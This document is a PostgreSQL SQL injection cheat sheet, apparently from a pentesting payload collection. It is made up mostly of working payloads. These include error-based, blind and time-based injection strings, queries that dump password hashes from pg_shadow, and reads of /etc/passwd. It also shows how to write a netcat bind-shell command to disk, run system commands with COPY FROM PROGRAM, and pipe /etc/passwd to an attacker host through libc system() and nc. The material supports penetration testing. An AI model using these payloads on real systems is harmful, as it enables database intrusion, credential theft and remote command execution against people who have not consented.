# PostgreSQL injection

## Summary

* [PostgreSQL Comments](#postgresql-comments)
* [PostgreSQL version](#postgresql-version)
* [PostgreSQL Current User](#postgresql-current-user)
* [PostgreSQL List Users](#postgresql-list-users)
* [PostgreSQL List Password Hashes](#postgresql-list-password-hashes)
* [PostgreSQL List Database Administrator Accounts](#postgresql-list-database-administrator-accounts)
* [PostgreSQL List Privileges](#postgresql-list-privileges)
* [PostgreSQL Check if Current User is Superuser](#postgresql-check-if-current-user-is-superuser)
* [PostgreSQL database name](#postgresql-database-name)
* [PostgreSQL List databases](#postgresql-list-database)
* [PostgreSQL List tables](#postgresql-list-tables)
* [PostgreSQL List columns](#postgresql-list-columns)
* [PostgreSQL Error Based](#postgresql-error-based)
* [PostgreSQL XML Helpers](#postgresql-xml-helpers)
* [PostgreSQL Blind](#postgresql-blind)
* [PostgreSQL Time Based](#postgresql-time-based)
* [PostgreSQL Stacked query](#postgresql-stacked-query)
* [PostgreSQL File Read](#postgresql-file-read)
* [PostgreSQL File Write](#postgresql-file-write)
* [PostgreSQL Command execution](#postgresql-command-execution)
    * [CVE-2019–9193](#cve-20199193)
    * [Using libc.so.6](#using-libcso6)
* [Bypass Filter](#bypass-filter)
* [References](#references)

## PostgreSQL Comments

```sql
--
/**/  
```

## PostgreSQL Version

```sql
SELECT version()
```

## PostgreSQL Current User	

```sql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

## PostgreSQL List Users

```sql
SELECT usename FROM pg_user
```

## PostgreSQL List Password Hashes

```sql
SELECT usename, passwd FROM pg_shadow 
```
## PostgreSQL List Database Administrator Accounts
```sql
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```
## PostgreSQL List Privileges

```sql
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
```

## PostgreSQL Check if Current User is Superuser

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

## PostgreSQL Database Name

```sql
SELECT current_database()
```

## PostgreSQL List Database

```sql
SELECT datname FROM pg_database
```

## PostgreSQL List Tables

```sql
SELECT table_name FROM information_schema.tables
```

## PostgreSQL List Columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

## PostgreSQL Error Based

```sql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

## PostgreSQL XML helpers

```sql
select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

The `query_to_xml` above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](#postgresql-error-based) technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.

```sql
select database_to_xml(true,true,''); -- dump the current database to XML
select database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
```

Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.

## PostgreSQL Blind

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
```

## PostgreSQL Time Based

```sql
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL Stacked Query

Use a semi-colon ";" to add another query

```sql
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
```

## PostgreSQL File Read

```sql
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions (as of [this](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.

```sql
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

```sql
SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
SELECT lo_get(16420); -- use the OID returned from the above
SELECT * from pg_largeobject; -- or just get all the large objects and their data
```

## PostgreSQL File Write

```sql
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

```sql
SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
```

## PostgreSQL Command execution

### CVE-2019–9193

Can be used from [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. 

```SQL
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

![https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png](https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png)

### Using libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

### Bypass Filter

#### Quotes

Using CHR

```sql
SELECT CHR(65)||CHR(66)||CHR(67);
```

Using Dollar-signs  ( >= version 8 PostgreSQL)

```sql
SELECT $$This is a string$$
SELECT $TAG$This is another string$TAG$
```



## References

* [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - Mar 20 2019 - GreenWolf](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
* [SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov)](https://hackerone.com/reports/181803)
* [POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [SQL Injection and Postgres - An Adventure to Eventual RCE - May 05, 2020 - Denis Andzakovic](https://pulsesecurity.co.nz/articles/postgres-sqli)
* [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - 2009 - INFIGO](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
